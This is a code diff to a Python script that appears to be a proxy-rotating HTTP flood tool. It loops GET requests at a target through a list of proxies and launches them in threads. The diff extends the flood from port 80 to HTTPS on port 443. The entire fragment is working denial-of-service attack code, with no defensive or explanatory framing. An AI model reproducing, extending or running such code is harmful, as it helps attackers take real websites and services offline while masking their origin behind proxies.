@@ -584,7 +584,7 @@ proxies_list = [
 
 def http_method():
     for i in range(x):
-        ports = ("80", "80")
+        ports = ("80","443")
         port = random.choice(ports)
         targ1 = targ+":"+port
 
@@ -603,6 +603,13 @@ def http_method():
                 print(f"Status Code 'GET': {response.status_code} | Proxy: {proxy} | TARGET : {targ1}")
             except requests.RequestException as e:
                 print(f"Request failed for proxy {proxy}: {e}")
+        if port == "443":
+            try:
+                response = requests.get("https://"+targ1, headers=headers1, proxies=proxies, timeout=10)
+                print(f"Status Code 'GET': {response.status_code} | Proxy: {proxy} | TARGET : {targ1}")
+            except requests.RequestException as e:
+                print(f"Request failed for proxy {proxy}: {e}")
+
 
 if method == 4:
     for _ in range(threads): # Start x amount of threads
